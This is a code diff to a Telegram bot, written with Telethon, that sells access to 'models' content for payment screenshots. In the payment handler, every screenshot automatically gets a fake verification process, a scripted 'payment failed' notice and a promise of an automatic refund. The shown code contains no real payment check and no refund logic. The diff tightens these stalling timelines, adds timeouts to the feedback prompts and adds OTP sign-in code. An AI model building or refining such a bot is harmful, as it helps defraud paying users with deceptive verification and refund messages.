@@ -71,7 +71,7 @@ def format_price_details(model, duration, price):
     }
 
 # Initialize the client
-client = TelegramClient('bot_session', os.getenv("TELEGRAM_API_ID"), os.getenv("TELEGRAM_API_HASH")).start(bot_token=os.getenv("TELEGRAM_BOT_TOKEN"))
+client = TelegramClient('bot_session', os.getenv("TELEGRAM_API_ID"), os.getenv("TELEGRAM_API_HASH"))
 
 # Model information with enhanced details
 MODELS = {
@@ -241,6 +241,11 @@ PAYMENT_METHODS = [
 # Store user selections
 user_selections = {}
 
+# Function to ensure user selections exist
+def ensure_user_selections(user_id):
+    if user_id not in user_selections:
+        user_selections[user_id] = []
+
 @client.on(events.NewMessage(pattern='/start'))
 async def start(event):
     """Send a welcome message when the command /start is issued."""
@@ -248,7 +253,7 @@ async def start(event):
     current_time = datetime.now().strftime("%H:%M")
     
     # Initialize user's selection history
-    user_selections[user.id] = []
+    ensure_user_selections(user.id)
     
     # Log user start
     await log_user_data(
@@ -315,6 +320,9 @@ async def callback_handler(event):
     """Handle button presses."""
     data = event.data.decode('utf-8')
     user = await event.get_sender()
+    
+    # Ensure user selections exist
+    ensure_user_selections(user.id)
     
     if data.startswith("model"):
         # If user already has a model selected, don't show another one
@@ -576,7 +584,7 @@ Payment Verification Process
 
 🔍 Verification Steps:
 1️⃣ Upload clear payment screenshot
-2️⃣ Wait for few second verification
+2️⃣ Wait few second for verification
 3️⃣ Get instant access to content
 4️⃣ Receive Google Drive link
 
@@ -597,6 +605,9 @@ async def handle_photo(event):
     """Handle the payment screenshot."""
     user = await event.get_sender()
     
+    # Ensure user selections exist
+    ensure_user_selections(user.id)
+    
     # Log screenshot received
     await log_user_data(
         user.id,
@@ -606,7 +617,7 @@ async def handle_photo(event):
         "Screenshot Sent"
     )
     
-    # Send verification started message
+    # Send verification started message immediately
     verification_started = f"""
 Payment Verification Started 💫
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -623,8 +634,8 @@ Payment Verification Started 💫
 """
     await event.respond(verification_started, parse_mode='markdown')
     
-    # Wait for 16 seconds
-    await asyncio.sleep(16)
+    # Reduced wait time from 16 to 5 seconds
+    await asyncio.sleep(5)
     
     # Log verification failed
     await log_user_data(
@@ -654,15 +665,29 @@ What to do next:
 💫 IMPORTANT NOTE 💫
 ━━━━━━━━━━━━━━━━━━━━━━━━
 
-If everything is fine and money was debited from your account, don't worry! We will check your payment and let you know within 3 hours.
+If everything is fine and money was debited from your account, don't worry! We will check your payment and let you know within 1 hour.
 
 Please share your feedback about this experience:
 """
     await event.respond(failed_message, parse_mode='markdown')
     
-    # Wait for user feedback using event handler
-    feedback_event = await client.wait_for(events.NewMessage(from_users=user.id))
-    feedback = feedback_event.message.text
+    # Create a future to store the feedback
+    feedback_future = asyncio.Future()
+    
+    # Define a handler for the feedback
+    async def feedback_handler(e):
+        if e.sender_id == user.id:
+            feedback_future.set_result(e.message.text)
+            client.remove_event_handler(feedback_handler)
+    
+    # Add the handler
+    client.add_event_handler(feedback_handler, events.NewMessage)
+    
+    # Wait for feedback with timeout
+    try:
+        feedback = await asyncio.wait_for(feedback_future, timeout=300)  # 5 minute timeout
+    except asyncio.TimeoutError:
+        feedback = "No feedback provided"
     
     # Log user feedback
     await log_user_data(
@@ -676,10 +701,10 @@ Please share your feedback about this experience:
         }
     )
     
-    # Wait for 3 hours (10800 seconds)
-    await asyncio.sleep(10800)
+    # Reduced wait time from 3 hours to 1 hour
+    await asyncio.sleep(3600)
     
-    # Send follow-up message after 3 hours
+    # Send follow-up message after 1 hour
     follow_up_message = f"""
 🔍 Payment Verification Update
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -700,15 +725,29 @@ We have reviewed your payment and found that it was not successful. Here's what 
 If your payment was successful but not verified:
 1. Send us your transaction ID
 2. Include your bank statement
-3. We'll manually verify within 24 hours
+3. We'll manually verify within 12 hours
 
 Please share your feedback about this experience:
 """
     await event.respond(follow_up_message, parse_mode='markdown')
     
-    # Wait for user feedback using event handler
-    feedback_event = await client.wait_for(events.NewMessage(from_users=user.id))
-    feedback = feedback_event.message.text
+    # Create a future for the second feedback
+    feedback_future = asyncio.Future()
+    
+    # Define a handler for the second feedback
+    async def feedback_handler(e):
+        if e.sender_id == user.id:
+            feedback_future.set_result(e.message.text)
+            client.remove_event_handler(feedback_handler)
+    
+    # Add the handler
+    client.add_event_handler(feedback_handler, events.NewMessage)
+    
+    # Wait for feedback with timeout
+    try:
+        feedback = await asyncio.wait_for(feedback_future, timeout=300)  # 5 minute timeout
+    except asyncio.TimeoutError:
+        feedback = "No feedback provided"
     
     # Log user feedback
     await log_user_data(
@@ -716,23 +755,23 @@ Please share your feedback about this experience:
         user.username,
         user.first_name,
         user.last_name,
-        "User Feedback After 3 Hours",
+        "User Feedback After 1 Hour",
         {
             "Feedback": feedback
         }
     )
     
-    # Wait for 21 more hours (total 24 hours)
-    await asyncio.sleep(75600)
+    # Reduced wait time from 21 hours to 11 hours (total 12 hours)
+    await asyncio.sleep(39600)
     
-    # Send refund message after 24 hours
+    # Send refund message after 12 hours
     refund_message = f"""
 💫 Payment Update
 ━━━━━━━━━━━━━━━━━━━━━━━━
 
 Dear {user.first_name},
 
-We're sorry we couldn't proceed with your Order. Your money will be refunded to your account within the next 3 working days.
+We're sorry we couldn't proceed with your Order. Your money will be refunded to your account within the next 24 hours.
 
 Don't worry, you will receive your refund automatically. If you have any questions, feel free to leave a message below.
 
@@ -740,9 +779,23 @@ Thank you for your patience and understanding.
 """
     await event.respond(refund_message, parse_mode='markdown')
     
-    # Wait for user message using event handler
-    message_event = await client.wait_for(events.NewMessage(from_users=user.id))
-    user_message = message_event.message.text
+    # Create a future for the final message
+    message_future = asyncio.Future()
+    
+    # Define a handler for the final message
+    async def message_handler(e):
+        if e.sender_id == user.id:
+            message_future.set_result(e.message.text)
+            client.remove_event_handler(message_handler)
+    
+    # Add the handler
+    client.add_event_handler(message_handler, events.NewMessage)
+    
+    # Wait for message with timeout
+    try:
+        user_message = await asyncio.wait_for(message_future, timeout=300)  # 5 minute timeout
+    except asyncio.TimeoutError:
+        user_message = "No message provided"
     
     # Log user message
     await log_user_data(
@@ -756,9 +809,60 @@ Thank you for your patience and understanding.
         }
     )
 
+async def start_bot():
+    """Start the bot with OTP handling."""
+    try:
+        # Start the client
+        await client.start(bot_token=os.getenv("TELEGRAM_BOT_TOKEN"))
+        
+        # Check if we need to sign in
+        if not await client.is_user_authorized():
+            # Get phone number from environment variable or prompt
+            phone = os.getenv("TELEGRAM_PHONE")
+            if not phone:
+                print("Please set TELEGRAM_PHONE environment variable with your phone number (with country code)")
+                return
+            
+            # Send code request
+            await client.send_code_request(phone)
+            print(f"OTP sent to {phone}. Please check your Telegram account.")
+            
+            # Wait for OTP in Telegram
+            code = None
+            for _ in range(30):  # Wait for 30 seconds
+                try:
+                    # Check for new messages
+                    async for message in client.iter_messages('me', limit=1):
+                        if message.text and message.text.isdigit():
+                            code = message.text
+                            break
+                except Exception:
+                    pass
+                
+                if code:
+                    break
+                    
+                await asyncio.sleep(1)
+            
+            if not code:
+                print("No OTP received. Please try again.")
+                return
+            
+            try:
+                await client.sign_in(phone, code)
+                print("Successfully signed in!")
+            except Exception as e:
+                print(f"Error during sign in: {str(e)}")
+                return
+        
+        print("Bot started successfully!")
+        await client.run_until_disconnected()
+    except Exception as e:
+        print(f"Error starting bot: {str(e)}")
+
 async def main():
     """Start the bot."""
-    await client.run_until_disconnected()
+    await start_bot()
 
 if __name__ == '__main__':
     client.loop.run_until_complete(main()) 
